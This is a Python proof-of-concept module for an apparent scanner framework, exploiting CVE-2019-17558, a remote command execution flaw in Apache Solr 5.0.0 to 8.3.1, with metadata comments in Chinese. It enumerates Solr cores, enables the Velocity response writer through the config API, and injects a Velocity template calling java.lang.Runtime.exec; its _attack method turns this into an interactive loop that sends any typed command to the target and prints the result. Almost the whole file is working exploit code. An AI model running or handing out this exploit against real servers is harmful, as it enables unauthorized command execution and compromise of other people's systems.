#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import time

from newpoc.cli import POC_QUEUE
from newpoc.api import PocBase, Output, requests, json, sys
from newpoc.utils.randim_str import generate_random_str
from urllib.parse import urljoin as parse_urljoin


class POC(PocBase):
    cnvd_cve = 'CVE-2019-17558'  # 漏洞编号
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者名字
    vulDate = '2022-11-27'  # 漏洞公开的时间
    createDate = '2022-11-28'  # 编写 PoC 的日期
    updateDate = '2022-11-28'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源
    name = 'Apache Solr 远程命令执行'  # PoC 名称
    appPowerLink = 'https://solr.apache.org/'  # 漏洞厂商主页地址
    appName = 'Apache Solr'  # 漏洞应用名称
    appVersion = '5.0.0/8.3.1'  # 漏洞影响版本
    vulType = 'RCE'  # 漏洞类型
    desc = '''
        用户可以注入自定义模板，通过Velocity模板语言执行任意命令。
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/solr/CVE-2019-17558.py"

    output = Output()

    def _verify(self, ip=None):
        result = POC.parse_output()
        # random_string = self.generate_random_str()
        headers = {
            'Host': ip['url'],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.8,zh-CN;q=0.5,zh;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        if not ip['url'].startswith("http"):
            ip['url'] = 'http://' + ip['url']

        get_core_ip = parse_urljoin(ip['url'], '/solr/admin/cores?indexInfo=false&wt=json')

        payload_headers = {
            'Host': ip['url'],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
            'Content-Type': 'application/json',
            'Content-Length': '261'
        }

        inject_model_json = {
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
            }
        }

        rce_payload = '/solr/{0}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27echo+{1}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
        random_str = generate_random_str()
        try:
            #获取core
            res = requests.get(get_core_ip, headers=headers)
            core_name = json.loads(res.text)
            rce_model = list(core_name['status'].keys())[0]

            # 注入velocity模板
            injet_url = parse_urljoin(ip['url'], '/solr/{}/config'.format(rce_model))
            requests.post(injet_url, headers=payload_headers, json=inject_model_json)
            time.sleep(1)
            # RCE
            rce_payload = ip['url'] + rce_payload.format(rce_model, random_str)
            cmd_res = requests.get(rce_payload).text
            if cmd_res.find(random_str) != -1 and cmd_res.find('{{error}}') == -1:
                result['target-url'] = ip['url']
                result['payload'] = rce_model
                self.output.success('CVE-2019-17558:{} is vulnerable {}'.format(ip['url'], rce_model))
                POC_QUEUE.put(result)
            return (ip['url'], rce_model)
        except Exception as err:
            self.output.fail('CVE-2019-17558:{0} is fail {1}'.format(ip['url'], err))

    def _attack(self, payload=None):
        try:
            url, core = self._verify(payload)
            while True:
                cmd = input("[master]:")
                if cmd == 'exit':
                    sys.exit(0)
                rce_payload = '/solr/' + core + '/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27' + cmd + '%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
                rce_payload = parse_urljoin(url, rce_payload)
                cmd_res = requests.get(rce_payload).text
                print(cmd_res)
        except:
            pass

    def _shell(self):
        pass

    @staticmethod
    def parse_output():
        result = {
            "target-url": '',
            "poc-name": POC.name,
            "poc-id": POC.cnvd_cve,
            "component": POC.vulType,
            "version": POC.appVersion,
            "status": 'ok',
            "payload": ''
        }
        return result


if __name__ == "__main__":
    c = POC()
    print(c.parse_detail())
